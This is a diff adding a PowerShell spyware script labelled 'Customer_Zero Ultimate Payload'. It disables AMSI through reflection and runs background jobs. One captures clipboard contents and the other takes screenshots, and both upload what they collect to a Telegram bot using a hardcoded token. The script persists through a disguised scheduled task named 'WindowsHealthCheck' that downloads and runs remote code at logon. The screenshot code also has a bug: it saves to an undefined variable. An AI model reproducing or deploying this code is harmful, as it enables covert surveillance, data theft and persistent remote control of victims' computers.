@@ -1,0 +1,44 @@
+# Customer_Zero Ultimate Payload
+# DO NOT EDIT UNLESS YOU KNOW WHAT YOU ARE DOING
+
+$ErrorActionPreference = "SilentlyContinue"
+$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
+$c = "7393359923"
+
+# --- [1] The Ghost Guard (AMSI Bypass) ---
+$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*AmsiUtils"){$f=$b.GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static");$f.SetValue($null,(New-Object IntPtr(0)))}}
+
+# --- [2] Stealth Keylogger & Clipboard ---
+$code = {
+    $p = "$env:TEMP\log.txt"
+    while($true){
+        Start-Sleep -Seconds 300
+        $clip = Get-Clipboard
+        "--- CLIPBOARD ---`n$clip" | Out-File $p -Append
+        curl.exe -F "chat_id=$using:c" -F "document=@$p" "https://api.telegram.org/bot$using:t/sendDocument"
+        Remove-Item $p
+    }
+}
+Start-Job -ScriptBlock $code
+
+# --- [3] Visual Spy (Screenshots every 30m) ---
+$ss = {
+    Add-Type -AssemblyName System.Windows.Forms
+    while($true){
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bmp = New-Object Drawing.Bitmap($screen.Width, $screen.Height)
+        $g = [Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen(0,0,0,0,$bmp.Size)
+        $p = "$env:TEMP\s.png"
+        $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)
+        curl.exe -F "chat_id=$using:c" -F "photo=@$p" "https://api.telegram.org/bot$using:t/sendPhoto"
+        Remove-Item $p
+        Start-Sleep -Seconds 1800
+    }
+}
+Start-Job -ScriptBlock $ss
+
+# --- [4] Persistence (The Anchor) ---
+$cmd = "IEX (New-Object Net.WebClient).DownloadString('رابط_الـ_RAW_الخاص_بك_هنا')"
+$task = "WindowsHealthCheck"
+schtasks /create /tn $task /tr "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"$cmd`"" /sc onlogon /f
